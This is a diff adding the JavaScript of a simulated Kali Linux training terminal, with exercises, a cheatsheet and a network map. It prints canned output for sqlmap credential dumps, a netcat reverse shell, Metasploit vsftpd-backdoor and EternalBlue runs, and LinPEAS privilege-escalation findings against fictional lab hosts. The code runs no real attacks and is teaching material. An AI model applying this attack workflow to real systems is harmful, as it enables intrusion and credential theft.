+  out('[12:10:01] [INFO] target URL content is stable','out-line');
+  out('[12:10:02] [INFO] GET parameter \'id\' appears to be dynamic','out-line');
+  out('[12:10:03] [INFO] heuristic detects web page charset \'utf-8\'','out-dim');
+  out('[12:10:03] <span class="out-pwned">[CRITICAL] GET parameter \'id\' appears to be \'MySQL >= 5.0 OR error-based\' injectable</span>','out-line');
+  out('[12:10:04] [INFO] the back-end DBMS is MySQL','out-success');
+  out('web application technology: PHP 5.6.40, Apache 2.4.18','out-line');
+  out('back-end DBMS: MySQL >= 5.0 (MariaDB fork)','out-warn');
+  if(/--dump/.test(full)){
+    out('','');
+    out('Database: dvwa','out-info');
+    out('Table: users','out-info');
+    out('[6 entries]','out-line');
+    out('+----+---------+---------------------------------------------+','out-dim');
+    out('| id | user    | password                                    |','out-info');
+    out('+----+---------+---------------------------------------------+','out-dim');
+    out('| 1  | admin   | <span class="out-pwned">5f4dcc3b5aa765d61d8327deb882cf99 (password)</span> |','out-success');
+    out('| 2  | gordonb | e99a18c428cb38d5f260853678922e03 (abc123) |','out-success');
+    out('| 3  | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)|','out-success');
+    out('+----+---------+---------------------------------------------+','out-dim');
+    out('[+] FLAG{dvw4_sql1_pwn3d}','out-flag');
+    STATE.flags.push('FLAG{dvw4_sql1_pwn3d}');
+    STATE.exploited['10.10.10.102']=true;
+    renderNetwork();
+  } else {
+    out('available databases [3]:','out-info');
+    out('[*] information_schema','out-success');
+    out('[*] dvwa','out-success');
+    out('[*] mysql','out-line');
+    out('','');
+    out('[+] Use --dump to extract table data','out-warn');
+  }
+}
+
+function cmdNc(args){
+  const lFlag=args.includes('-l')||args.includes('-nlvp')||args.includes('-nvlp');
+  const port=args.find(a=>/^\d{3,5}$/.test(a))||'4444';
+  if(lFlag){
+    out(`Listening on [0.0.0.0] (family 0, port ${port})`,'out-info');
+    out('Connection from 10.10.10.100:52341 received!','out-success');
+    out('<span class="out-pwned">root@metasploitable:~# </span>','out-line');
+    out('[+] Reverse shell received! You now have remote access.','out-pwned');
+    STATE.exploited['10.10.10.100']=true;
+    renderNetwork();
+  } else {
+    const ip=args.find(a=>/^\d+\.\d+/.test(a));
+    if(ip) out(`(UNKNOWN) [${ip}] ${port} (?) open`,'out-success');
+    else out('nc: missing host','out-error');
+  }
+}
+
+function cmdMsfconsole(){
+  out('','');
+  out('  <span style="color:#C792EA">__  __  __  __  __  __  ____  __  __</span>','out-line');
+  out('  <span style="color:#C792EA">|\\/ \\/ \\/ \\/ \\/ \\/ |__\\ \\/ \\/ \\/ \\|</span>','out-line');
+  out('  <span style="color:#E879F9">     metasploit v6.3.44-dev</span>','out-line');
+  out('','');
+  out('       =[ <span class="out-pwned">metasploit v6.3.44</span> ]','out-line');
+  out('+ -- --=[ 2374 exploits - 1232 auxiliary - 416 post ]','out-dim');
+  out('+ -- --=[ 1006 payloads - 45 encoders - 11 nops ]','out-dim');
+  out('+ -- --=[ 9 evasion ]','out-dim');
+  out('','');
+  out('[!] Metasploit mode active. Type <code style="color:var(--kali-yellow)">exit</code> to leave.','out-warn');
+  out('Available: use, search, set, show options, run, exploit, exit','out-dim');
+  out('','');
+  STATE.msfMode=true;
+  STATE.msfCtx={};
+  updatePrompt();
+}
+
+function handleMsfCommand(cmd){
+  const parts=cmd.trim().split(/\s+/);
+  const verb=parts[0];
+  if(verb==='exit'||verb==='quit'){
+    STATE.msfMode=false;
+    STATE.msfCtx={};
+    updatePrompt();
+    out('Leaving Metasploit Framework...','out-dim');
+    return;
+  }
+  if(verb==='search'){
+    const q=parts.slice(1).join(' ').toLowerCase();
+    out(`Matching Modules`,'out-info');
+    out(`================`,'out-dim');
+    out(`   #  Name                                        Rank    Check  Description`,'out-info');
+    out(`   -  ----                                        ----    -----  -----------`,'out-dim');
+    if(/vsftpd/.test(q)){
+      out(`   0  exploit/unix/ftp/vsftpd_234_backdoor        excellent  Yes  vsftpd 2.3.4 Backdoor`,'out-vuln');
+    } else if(/ms17|eternal|smb/.test(q)){
+      out(`   0  exploit/windows/smb/ms17_010_eternalblue    excellent  Yes  MS17-010 EternalBlue RCE`,'out-pwned');
+      out(`   1  exploit/windows/smb/ms17_010_psexec         normal     Yes  MS17-010 EternalBlue + Psexec`,'out-warn');
+    } else {
+      out(`   (No modules found for: ${q})`,'out-dim');
+      out(`   Try: search vsftpd | search ms17-010 | search eternalblue`,'out-info');
+    }
+    return;
+  }
+  if(verb==='use'){
+    const mod=parts.slice(1).join(' ');
+    STATE.msfCtx.module=mod;
+    if(/vsftpd/.test(mod)){
+      STATE.msfCtx.options={RHOSTS:'',RPORT:'21',LHOST:'10.10.10.50',LPORT:'4444'};
+      out(`msf6 exploit(unix/ftp/vsftpd_234_backdoor) >`,'out-success');
+    } else if(/ms17|eternal/.test(mod)){
+      STATE.msfCtx.options={RHOSTS:'',RPORT:'445',LHOST:'10.10.10.50',LPORT:'4444'};
+      out(`msf6 exploit(windows/smb/ms17_010_eternalblue) >`,'out-pwned');
+    } else {
+      out(`msf6 exploit(${mod}) >`,'out-line');
+    }
+    updatePrompt();
+    return;
+  }
+  if(verb==='set'){
+    if(parts.length<3){out('Usage: set OPTION VALUE','out-error');return;}
+    const opt=parts[1], val=parts.slice(2).join(' ');
+    if(STATE.msfCtx.options) STATE.msfCtx.options[opt]=val;
+    out(`${opt} => ${val}`,'out-success');
+    return;
+  }
+  if(verb==='show'&&parts[1]==='options'){
+    const opts=STATE.msfCtx.options||{};
+    out('Module options:\n','out-info');
+    out(`   Name    Value           Required  Description`,'out-info');
+    out(`   ----    -----           --------  -----------`,'out-dim');
+    Object.entries(opts).forEach(([k,v])=>{
+      out(`   ${k.padEnd(8)}${(v||'[empty]').padEnd(16)}yes       Target ${k.toLowerCase()}`,'out-line');
+    });
+    return;
+  }
+  if(verb==='run'||verb==='exploit'){
+    const opts=STATE.msfCtx.options||{};
+    const rhosts=opts.RHOSTS||'';
+    if(!rhosts){out('[-] RHOSTS not set. Use: set RHOSTS 10.10.10.100','out-error');return;}
+    out(`[*] Started reverse TCP handler on ${opts.LHOST||'10.10.10.50'}:${opts.LPORT||'4444'}`,'out-info');
+    out(`[*] ${rhosts}:${opts.RPORT||'21'} - Connecting...`,'out-line');
+    if(/vsftpd/.test(STATE.msfCtx.module||'')){
+      out(`[*] ${rhosts}:21 - Banner: 220 (vsFTPd 2.3.4)`,'out-line');
+      out(`[*] ${rhosts}:21 - USER: 331 Please specify the password.`,'out-line');
+      out(`[*] Attempting to trigger backdoor...`,'out-warn');
+      out(`[+] ${rhosts}:21 - Backdoor service has been spawned, handling...`,'out-success');
+      out(`[+] ${rhosts}:21 - UID: uid=0(root) gid=0(root)`,'out-pwned');
+      out(`[*] Found shell on port 6200`,'out-success');
+      out(`[*] Command shell session 1 opened (${opts.LHOST||'10.10.10.50'}:${opts.LPORT||'4444'} -> ${rhosts}:6200)`,'out-pwned');
+      out(`[+] <span class="out-flag">FLAG{m3t4spl01t4bl3_pwn3d}</span>`,'out-flag');
+      STATE.flags.push('FLAG{m3t4spl01t4bl3_pwn3d}');
+      STATE.exploited[rhosts]=true;
+    } else if(/ms17|eternal/.test(STATE.msfCtx.module||'')){
+      out(`[*] ${rhosts}:445 - Connecting to target for exploitation.`,'out-line');
+      out(`[+] ${rhosts}:445 - Connection established for exploitation.`,'out-success');
+      out(`[+] ${rhosts}:445 - Target OS selected valid for OS indicated by SMB reply`,'out-line');
+      out(`[*] ${rhosts}:445 - CORE raw buffer dump (38 bytes)`,'out-dim');
+      out(`[*] Sending all but last fragment of exploit packet`,'out-warn');
+      out(`[+] ${rhosts}:445 - =-=-=-=-=-=- KERNAL SESSION OPENED =-=-=-=-=-=-`,'out-pwned');
+      out(`[*] Meterpreter session 1 opened (${opts.LHOST}:4444 -> ${rhosts}:1034)`,'out-pwned');
+      out(`[+] <span class="out-flag">FLAG{3t3rn4l_blu3_pwn3d}</span>`,'out-flag');
+      STATE.flags.push('FLAG{3t3rn4l_blu3_pwn3d}');
+      STATE.exploited[rhosts]=true;
+    } else {
+      out(`[-] Exploit failed: module not configured correctly.`,'out-error');
+    }
+    renderNetwork();
+    return;
+  }
+  if(verb==='help'){
+    out('Commands: search <query>, use <module>, set <opt> <val>, show options, run, exploit, exit','out-info');
+    return;
+  }
+  out(`msf6 > Unknown command: ${verb}. Type help for usage.`,'out-error');
+}
+
+function cmdBash(args){
+  if(args.length&&/linpeas/.test(args.join(' '))){
+    out('[!] Running LinPEAS — Linux Privilege Escalation Awesome Script','out-warn');
+    out('','');
+    out('<span style="color:#FF3E3E">╔══════════╣ Basic information</span>','out-line');
+    out('OS: Linux 6.6.9-amd64 #1 SMP x86_64 GNU/Linux','out-line');
+    out('User: root | Shell: /bin/bash','out-success');
+    out('','');
+    out('<span style="color:#FF3E3E">╔══════════╣ Sudo version</span>','out-line');
+    out('Sudo version 1.9.13p3','out-line');
+    out('','');
+    out('<span style="color:#FF3E3E">╔══════════╣ SUID binaries</span>','out-line');
+    out('<span class="out-vuln">-rwsr-xr-x 1 root root /usr/bin/pkexec   # CVE-2021-4034 PwnKit!</span>','out-warn');
+    out('<span class="out-vuln">-rwsr-xr-x 1 root root /usr/local/bin/backup  # Custom SUID binary</span>','out-pwned');
+    out('-rwsr-xr-x 1 root root /usr/bin/sudo','out-line');
+    out('-rwsr-xr-x 1 root root /usr/bin/passwd','out-line');
+    out('','');
+    out('<span style="color:#FF3E3E">╔══════════╣ Interesting files (cron)</span>','out-line');
+    out('*/5 * * * * root /usr/local/sbin/cleanup.sh  (world-writable!)','out-pwned');
+    out('','');
+    out('<span style="color:#FF3E3E">╔══════════╣ CVEs</span>','out-line');
+    out('[+] [CVE-2021-4034] PwnKit — /usr/bin/pkexec','out-pwned');
+    out('[+] [CVE-2019-18634] sudo pwdfeedback','out-vuln');
+  } else {
+    out('bash: '+args.join(' ').replace(/</g,'&lt;'),'out-line');
+  }
+}
+
+function cmdSudo(args,full){
+  if(args[0]==='-l'){
+    out('Matching Defaults entries for root on kali: env_reset, mail_badpass','out-line');
+    out('User root may run the following commands on kali:','out-info');
+    out('    (ALL : ALL) ALL','out-success');
+    return;
+  }
+  runCommand(args.join(' '));
+}
+
+function cmdSsh(args){
+  const target=args.find(a=>!a.startsWith('-'))||'';
+  const ip=target.split('@').pop();
+  if(!NETWORK[ip]){out(`ssh: connect to host ${ip} port 22: Connection refused`,'out-error');return;}
+  out(`ssh: Warning: Permanently added '${ip}' (RSA) to known hosts.`,'out-warn');
+  out(`Connected to ${ip} — use exit to return.`,'out-success');
+}
+
+// ── Terminal Engine ───────────────────────────────────────────────────────────
+function out(html,cls='out-line'){
+  const el=document.createElement('div');
+  el.className=`line ${cls}`;
+  el.innerHTML=html;
+  document.getElementById('output').appendChild(el);
+  scrollTerm();
+}
+
+function outPromptLine(cmd){
+  const el=document.createElement('div');
+  el.className='line prompt-line';
+  el.innerHTML=promptHTML()+`<span class="cmd-echo">&nbsp;${escHtml(cmd)}</span>`;
+  document.getElementById('output').appendChild(el);
+}
+
+function promptHTML(){
+  const path=STATE.cwd.replace('/root','~');
+  if(STATE.msfMode){
+    const mod=STATE.msfCtx.module?`(${STATE.msfCtx.module.split('/').pop()}) `:'';
+    return `<span style="color:#C792EA">msf6 ${mod}> </span>`;
+  }
+  return `<span class="p-bracket">┌──(</span><span class="p-user">root</span><span class="p-at">&#9842;</span><span class="p-host">kali</span><span class="p-bracket">)-[</span><span class="p-path">${escHtml(path)}</span><span class="p-bracket">]</span><br><span class="p-bracket">└─</span><span class="p-hash">#</span>`;
+}
+
+function escHtml(s){ return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+function updatePrompt(){
+  const path=STATE.cwd.replace('/root','~');
+  document.getElementById('live-prompt').innerHTML=promptHTML()+'&nbsp;';
+  if(STATE.msfMode){
+    const mod=STATE.msfCtx.module?`(${STATE.msfCtx.module.split('/').pop()}) `:'';
+    document.querySelector('.term-title').textContent=`msf6 ${mod}>`;
+  } else {
+    document.querySelector('.term-title').textContent=`root@kali: ${path}`;
+  }
+}
+
+function clearOutput(){ document.getElementById('output').innerHTML=''; }
+
+function scrollTerm(){
+  const t=document.getElementById('terminal');
+  t.scrollTop=t.scrollHeight;
+}
+
+function focusInput(){ document.getElementById('cmd-input').focus(); }
+
+function handleKey(e){
+  const inp=e.target;
+  if(e.key==='Enter'){
+    const cmd=inp.value;
+    outPromptLine(cmd);
+    inp.value='';
+    if(cmd.trim()) runCommand(cmd);
+    checkExercise(cmd.trim());
+    scrollTerm();
+  } else if(e.key==='ArrowUp'){
+    e.preventDefault();
+    STATE.histIdx=Math.min(STATE.histIdx+1,STATE.history.length-1);
+    if(STATE.history[STATE.histIdx]) inp.value=STATE.history[STATE.histIdx];
+  } else if(e.key==='ArrowDown'){
+    e.preventDefault();
+    STATE.histIdx=Math.max(STATE.histIdx-1,-1);
+    inp.value=STATE.histIdx>=0?(STATE.history[STATE.histIdx]||''):'';
+  } else if(e.key==='Tab'){
+    e.preventDefault();
+    const val=inp.value;
+    const parts=val.split(' ');
+    const last=parts[parts.length-1];
+    const cmds=['nmap','nikto','gobuster','sqlmap','hydra','john','hashcat','searchsploit','enum4linux','smbclient','msfconsole','nc','cat','ls','cd','find','strings','file','md5sum','xxd','curl','whois','dig'];
+    const match=cmds.find(c=>c.startsWith(last.toLowerCase()));
+    if(match&&parts.length===1){ inp.value=match; }
+  }
+}
+
+// ── Exercise System ───────────────────────────────────────────────────────────
+let currentEx=null, currentTaskIdx=0;
+
+function checkExercise(cmd){
+  if(!currentEx) return;
+  const task=currentEx.tasks[currentTaskIdx];
+  if(!task) return;
+  if(task.check(cmd)){
+    currentTaskIdx++;
+    if(currentTaskIdx>=currentEx.tasks.length){
+      currentEx.done=true;
+      out(`✅ Exercise "${currentEx.title}" complete!`,'out-success');
+      updateProgress();
+      renderExercises();
+      currentEx=null;
+      document.getElementById('challenge-bar').style.display='none';
+    } else {
+      renderChallenge();
+    }
+  }
+}
+
+function startExercise(ex){
+  if(ex.done){ out(`Exercise "${ex.title}" already completed.`,'out-info'); return; }
+  currentEx=ex;
+  currentTaskIdx=0;
+  document.getElementById('challenge-bar').style.display='block';
+  renderChallenge();
+  out(`📖 Starting: ${ex.title} — ${ex.desc}`,'out-info');
+}
+
+function renderChallenge(){
+  if(!currentEx) return;
+  const task=currentEx.tasks[currentTaskIdx];
+  document.getElementById('challenge-text').innerHTML=
+    `[${currentTaskIdx+1}/${currentEx.tasks.length}] ${task.text}`;
+  document.getElementById('challenge-hint').classList.remove('visible');
+}
+
+function showHint(){
+  const task=currentEx&&currentEx.tasks[currentTaskIdx];
+  if(!task) return;
+  const hint=document.getElementById('challenge-hint');
+  hint.innerHTML='Hint: Try the command shown in the task description.';
+  hint.classList.add('visible');
+}
+
+function skipChallenge(){
+  if(!currentEx) return;
+  currentTaskIdx++;
+  if(currentTaskIdx>=currentEx.tasks.length){
+    currentEx=null;
+    document.getElementById('challenge-bar').style.display='none';
+  } else { renderChallenge(); }
+}
+
+function resetLab(){
+  EXERCISES.forEach(e=>{e.done=false;});
+  STATE.flags=[];
+  STATE.loot=[];
+  STATE.exploited={};
+  STATE.scanDone={};
+  currentEx=null;
+  currentTaskIdx=0;
+  document.getElementById('challenge-bar').style.display='none';
+  clearOutput();
+  boot();
+  renderExercises();
+  renderNetwork();
+  updateProgress();
+}
+
+function updateProgress(){
+  const done=EXERCISES.filter(e=>e.done).length;
+  const total=EXERCISES.length;
+  document.getElementById('prog-text').textContent=`${done} / ${total} done`;
+  document.getElementById('prog-fill').style.width=`${(done/total)*100}%`;
+}
+
+// ── Render Functions ──────────────────────────────────────────────────────────
+function renderExercises(){
+  const cont=document.getElementById('ex-list');
+  cont.innerHTML='';
+  const phases=[...new Set(EXERCISES.map(e=>e.phase))];
+  phases.forEach(phase=>{
+    const sec=document.createElement('div');
+    sec.className='ex-section';
+    sec.innerHTML=`<div class="ex-section-title">${phase}</div>`;
+    EXERCISES.filter(e=>e.phase===phase).forEach(ex=>{
+      const div=document.createElement('div');
+      div.className='ex-item'+(ex.done?' done':'')+(currentEx===ex?' active':'');
+      div.innerHTML=`<div class="ex-title"><span class="ex-badge badge-${ex.badge}">${ex.badge}</span>${ex.done?'✅ ':''} ${ex.title}</div><div class="ex-desc">${ex.desc}</div>`;
+      div.onclick=()=>startExercise(ex);
+      sec.appendChild(div);
+    });
+    cont.appendChild(sec);
+  });
+}
+
+function renderCheatsheet(){
+  const cont=document.getElementById('cheatsheet-content');
+  cont.innerHTML='';
+  CHEATSHEET.forEach(({cat,cmds})=>{
+    const sec=document.createElement('div');
+    sec.className='cs-section';
+    sec.innerHTML=`<div class="cs-title">${cat}</div>`;
+    cmds.forEach(({n,d})=>{
+      const div=document.createElement('div');
+      div.className='cs-cmd';
+      div.innerHTML=`<span class="cs-cmd-name">${escHtml(n)}</span><span class="cs-cmd-desc">${d}</span>`;
+      div.onclick=()=>{ document.getElementById('cmd-input').value=n; focusInput(); };
+      sec.appendChild(div);
+    });
+    cont.appendChild(sec);
+  });
+}
+
+function renderNetwork(){
+  const cont=document.getElementById('network-map');
+  cont.innerHTML='';
+  Object.entries(NETWORK).forEach(([ip,info])=>{
+    const isAttacker=info.role==='attacker';
+    const scanned=STATE.scanDone[ip];
+    const pwned=STATE.exploited[ip];
+    const cls=isAttacker?'attacker':pwned?'target scanned':scanned?'scanned':'target';
+    const div=document.createElement('div');
+    div.className=`net-host ${cls}`;
+    const badge=isAttacker?'<span class="net-status status-live">YOU</span>':
+      pwned?'<span class="net-status status-pwned">PWNED</span>':
+      scanned?'<span class="net-status status-live">SCANNED</span>':
+      '<span class="net-status status-unknown">UNKNOWN</span>';
+    const portStr=scanned&&info.ports?info.ports.slice(0,4).map(p=>`${p.num}/${p.proto}`).join(', ')+'...':'Run nmap to discover';
+    div.innerHTML=`<div class="net-host-ip">${ip} ${badge}</div><div class="net-host-name">${info.name} · ${info.os}</div><div class="net-host-ports">${portStr}</div>`;
+    cont.appendChild(div);
+  });
+}
+
+function showTab(name, el){
+  ['exercises','cheatsheet','network'].forEach(t=>{
+    document.getElementById('tab-'+t).style.display=t===name?'':'none';
+  });
+  document.querySelectorAll('.stab').forEach(s=>s.classList.remove('active'));
+  if(el) el.classList.add('active');
+}
+
+// ── Boot ──────────────────────────────────────────────────────────────────────
+function boot(){
+  clearOutput();
+  out('','');
+  out('  <span style="color:#C792EA;font-weight:700">Kali Linux 2024.1 — Cybersecurity Lab Terminal</span>','out-line');
+  out('  <span style="color:#6B7280">──────────────────────────────────────────────────</span>','out-line');
+  out('  Attacker IP : <span class="out-success">10.10.10.50</span>  (kali)','out-line');
+  out('  Target Range: <span class="out-warn">10.10.10.0/24</span>  (3 targets)','out-line');
+  out('','');
+  out('  <span class="out-warn">Targets:</span>','out-line');
+  out('    10.10.10.100  Metasploitable2  [FTP backdoor, MySQL]','out-port');
+  out('    10.10.10.101  Windows XP SP3   [EternalBlue SMBv1]','out-port');
+  out('    10.10.10.102  DVWA Box         [SQL Injection, XSS]','out-port');
+  out('','');
+  out('  Type <span class="out-warn">help</span> for commands · Click an exercise in the sidebar to begin','out-dim');
+  out('  Use the <span class="out-warn">Cheatsheet</span> tab to insert commands · Click commands to auto-fill','out-dim');
+  out('','');
+}
+
+window.onload=()=>{
+  boot();
+  updatePrompt();
+  renderExercises();
+  renderCheatsheet();
+  renderNetwork();
+  updateProgress();
+  focusInput();
+};
+</script>
+</body>
+</html>
